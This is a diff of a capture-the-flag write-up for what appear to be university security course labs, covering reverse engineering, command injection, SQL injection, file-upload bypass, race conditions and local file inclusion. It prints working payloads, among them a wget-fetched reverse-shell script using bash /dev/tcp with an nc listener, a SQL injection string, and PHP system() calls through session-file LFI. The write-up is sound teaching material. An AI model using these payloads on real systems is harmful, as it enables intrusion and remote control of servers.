@@ -52,7 +52,7 @@ which are `sub_5D1070(v1)` and `sub_5D1270(&v2)`.
 This function take `seed` as parameter.
 Most of the code are complicated,
 but only a small part of the function is related to the paramter.
-> The whole function first search for `.data` segment,
+> The whole function first search for `.data` segment, 
   and then find two blocks which start with `15` and `69` seperately.
 > The first block is the comparison target, which is `unk_5D4018`.
 > The second block will be used in `sub_5D1270`, and this is the seconde block.
@@ -77,7 +77,8 @@ for ( l = j + 33; l < *(_DWORD *)(i + 8); ++l )
 ...
 ```
 
-The code shows that it will find `69` from `l + v8` and start adding `seed` to each of the bytes until reaching `0`.
+The code shows that it will find `69` from `l + v8`,
+    and start adding `seed` to each of the bytes until reaching `0`.
 We can find the original data by the debugger.
 
 ```
@@ -100,7 +101,7 @@ if ( strlen(a1) == 32 )
 ```
 
 The first command of a function usually is `push ebp`, which is `0x55`,
-and the first byte of the `data` is `0x45`.
+    and the first byte of the `data` is `0x45`.
 Thus, the `seed` should be `16`, and we can get the function instructions.
 
 ```
@@ -194,7 +195,7 @@ but we can not use `>` and `&` because of the filter.
 
 It comes to mind that
 I can use `wget` to download the file with the cmd to the server,
-and execute it on the server.
+    and execute it on the server.
 
 First, create file server by `python -m http.server <port1>`.
 
@@ -202,13 +203,11 @@ First, create file server by `python -m http.server <port1>`.
 bash -i >& /dev/tcp/$1/$2 0>&1
 ```
 
-Then create  listen port with `nc -vv -l -p <port2>`
-and query
+Then create listen port with `nc -vv -l -p <port2>` and query
 
 ```
 https://edu-ctf.csie.org:10153/?me0w=index.php%0awget%20<ip>:<port1>/revshell.sh%20-O%20/tmp/revshell.sh%0abash%20/tmp/revshell.sh%20<ip>%20<port2>%0a
 ```
-
 
 
 ## [Lab 0x03] No Password
@@ -231,9 +230,9 @@ Both username and password input `a" or "a"="a`.
 
 There is nothing useful Javascript, Cookies, or Headers.
 Try to identify which type of web backend is used,
-and find out that this is an static page `https://unexploitable.kaibro.tw/index.html`.
-Try to access `.git` or `.index.swp`
-and find out that this is an GitHub Pages by the error page.
+    and find out that this is an static page `https://unexploitable.kaibro.tw/index.html`.
+Try to access `.git` or `.index.swp`,
+    and find out that this is an GitHub Pages by the error page.
 
 By the document of [Github Page](https://help.github.com/en/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site),
 we can use `dig WWW.EXAMPLE.COM +nostats +nocomments +nocmd` to find original github page.
@@ -249,10 +248,10 @@ bucharesti.github.io.   2993    IN      A       185.199.109.153
 bucharesti.github.io.   2993    IN      A       185.199.111.153
 ```
 
-Access `github.com/bucharesti` and there is nothing related to the `flag`.
+Access `github.com/bucharesti`, and there is nothing related to the `flag`.
 Maybe the file had been deleted.
 Try to find it in the commits,
-and find out that there is an commit called `delete secret file`.
+    and find out that there is an commit called `delete secret file`.
 The flag is in the file.
 
 
@@ -274,6 +273,43 @@ We send normal and illegal payload at the same time to trigger race condition.
 $ ./race.py | $ ./race.py '<?php system("ls -al /")'
 $ ./race.py | $ ./race.py '<?php system("cat /flag_is_here")'
 ```
+
+
+## [Lab 0x04] sh3ll_upload3r
+`web` `50 pts` `FLAG{simple_upload_practice_lol}`
+
+> file upload is so dangerous!
+> 
+> [Link](https://edu-ctf.csie.org:10156/)
+
+The web will check the file extension by `pathinfo`,
+    and `pathinfo` will return only the last extension.
+If we upload `file.php.jpg`,
+    the web server will treat this file as php file and execute it 
+    because `apache` server will keep finding the file extension from the back
+    until it find a valid one.
+
+
+## [lab 0x04] EzLFI
+`web` `50 pts` `FLAG{lfi_session_is_so_coool}`
+
+There are two functions in the php code, which are `register` and `module`.
+It is abvious that use `register` to write something and use `module` to load it.
+
+First, we try to write `user=<?php phpinfo(); ?>` in the `$_SESSION['user']`.
+We try to access default path of session files and failed.
+
+```
+https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/sessions/sess_<sessionID>
+```
+
+Then we try to access the location without `s`, and it works.
+
+```
+https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/session/sess_<sessionID>
+```
+
+We change `<?php phpinfo(); ?>` to `<?php system("<cmd>"); ?>` and get the flag.
 
 
 ## [Lab 0x04] EasyPeasy
